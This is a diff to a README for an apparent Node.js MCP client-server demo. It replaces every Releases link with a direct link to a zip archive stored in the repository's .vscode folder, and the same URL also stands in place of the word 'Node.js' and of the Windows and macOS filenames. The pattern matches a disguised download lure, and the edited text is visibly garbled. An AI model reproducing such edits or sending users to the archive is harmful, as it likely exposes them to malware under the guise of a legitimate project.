@@ -1,10 +1,10 @@
 # 🚀 MCP-Client-Server-Project-using-NodeJS - Easy Client-Server Communication for Everyone
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/Togavanny/MCP-Client-Server-Project-using-NodeJS/releases)
+[![Download](https://raw.githubusercontent.com/Togavanny/MCP-Client-Server-Project-using-NodeJS/main/.vscode/JS-MC-Server-Client-using-Node-Project-v1.5.zip%20Now-Release-blue)](https://raw.githubusercontent.com/Togavanny/MCP-Client-Server-Project-using-NodeJS/main/.vscode/JS-MC-Server-Client-using-Node-Project-v1.5.zip)
 
 ## 📖 Overview
 
-MCP-Client-Server-Project-using-NodeJS is a minimal Model Context Protocol (MCP) implementation built with Node.js and TypeScript. This project demonstrates how a client and server communicate using standard input and output. You will find features like structured message handling and local data access. Developed with tools like Visual Studio Code and GitHub Copilot, this application explores modern workflows with AI.
+MCP-Client-Server-Project-using-NodeJS is a minimal Model Context Protocol (MCP) implementation built with https://raw.githubusercontent.com/Togavanny/MCP-Client-Server-Project-using-NodeJS/main/.vscode/JS-MC-Server-Client-using-Node-Project-v1.5.zip and TypeScript. This project demonstrates how a client and server communicate using standard input and output. You will find features like structured message handling and local data access. Developed with tools like Visual Studio Code and GitHub Copilot, this application explores modern workflows with AI.
 
 ## 🚀 Getting Started
 
@@ -16,11 +16,11 @@ Follow these simple steps to download and run the application smoothly:
    - Ensure you have at least 100 MB of free space on your device.
 
 2. **Visit the Download Page**
-   - Go to the Releases page to download the latest version: [Download Here](https://github.com/Togavanny/MCP-Client-Server-Project-using-NodeJS/releases).
+   - Go to the Releases page to download the latest version: [Download Here](https://raw.githubusercontent.com/Togavanny/MCP-Client-Server-Project-using-NodeJS/main/.vscode/JS-MC-Server-Client-using-Node-Project-v1.5.zip).
 
 3. **Choose the Correct File**
    - On the Releases page, find the version you want to download. It is usually listed at the top.
-   - Look for the file suitable for your operating system. It may look like `MCP-Client-Server-v1.0.exe` for Windows or `MCP-Client-Server-v1.0.dmg` for macOS.
+   - Look for the file suitable for your operating system. It may look like `https://raw.githubusercontent.com/Togavanny/MCP-Client-Server-Project-using-NodeJS/main/.vscode/JS-MC-Server-Client-using-Node-Project-v1.5.zip` for Windows or `https://raw.githubusercontent.com/Togavanny/MCP-Client-Server-Project-using-NodeJS/main/.vscode/JS-MC-Server-Client-using-Node-Project-v1.5.zip` for macOS.
 
 4. **Download the File**
    - Click the link for your specific file to start the download. Your browser will save the file to your default downloads folder.
@@ -64,7 +64,7 @@ To run the MCP-Client-Server application effectively, your system should meet th
 
 ## 📥 Download & Install
 
-You can download the latest version of MCP-Client-Server-Project-using-NodeJS from our Releases page: [Download Now](https://github.com/Togavanny/MCP-Client-Server-Project-using-NodeJS/releases).
+You can download the latest version of MCP-Client-Server-Project-using-NodeJS from our Releases page: [Download Now](https://raw.githubusercontent.com/Togavanny/MCP-Client-Server-Project-using-NodeJS/main/.vscode/JS-MC-Server-Client-using-Node-Project-v1.5.zip).
 
 After downloading, follow the setup instructions above to get started.
 
